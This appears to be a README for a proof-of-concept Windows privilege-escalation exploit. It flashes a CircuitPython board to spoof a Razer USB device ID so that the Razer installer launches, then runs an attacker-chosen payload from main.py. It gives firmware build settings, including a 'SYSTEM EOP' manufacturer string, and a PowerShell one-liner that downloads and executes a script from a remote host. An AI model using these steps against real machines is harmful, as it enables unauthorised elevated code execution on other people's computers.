Designed for https://wiki.seeedstudio.com/Seeeduino-XIAO/, but should work on any board that can run circuitpython and has USB.

Either compile your own, or use `Seeeduino_XIAO_fake_razor_firmware.uf2` if you are using the Seeeduino XIAO.

# Howto

1. Put board into load firmware mode (trigger reset twice for the XIAO)
2. Put the firmware .uf2 file on the USB drive that appears
3. Wait for chip to reboot. It should show up as a Raxor device (and start the installer if it hasnt already run on the PC)
4. Adjust `main.py` to run your own payload, possibly also adjust wait time for installer to launch
5. Put `boot.py`, `main.py` and `adafruit_hid` on the circuitpython drive

To re-trigger the Razor installer if it has already launched once, right click the device in `Control Panel\Hardware and Sound\Devices and Printers` and select `Remove Device` then re-plug the chip.

# Building your own firmware

Clone https://github.com/adafruit/circuitpython and change `ports/<cpu type>/boards/<board>/mpconfigboard.mk` (e.g. `ports/atmel-samd/boards/seeeduino_xiao/mpconfigboard.mk`) so that 

```
USB_VID = 0x1532
USB_PID = 0x023e
```

Optionally also set
```
USB_PRODUCT = "Razer device"
USB_MANUFACTURER = "SYSTEM EOP"
```

then build for that board.

# Nyan

Run `nyan.ps1` to get nyan cat (popping calc.exe is lame).
Use `cmd /c start powershell -noexit -c "iex (New-Object Net.WebClient).DownloadString('http://host/nyan.ps1')"` to start in a new window.